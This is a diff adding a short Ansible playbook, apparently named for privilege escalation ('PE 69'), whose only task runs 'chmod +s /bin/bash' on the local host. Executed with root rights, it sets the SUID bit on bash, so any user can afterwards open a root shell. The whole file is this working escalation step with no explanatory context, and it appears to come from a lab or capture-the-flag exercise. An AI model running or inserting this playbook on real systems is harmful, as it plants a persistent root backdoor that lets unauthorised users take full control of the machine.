@@ -1,0 +1,5 @@
+- name: PE 69
+  hosts: localhost
+  tasks:
+    - name: shell
+      command: "chmod +s /bin/bash"
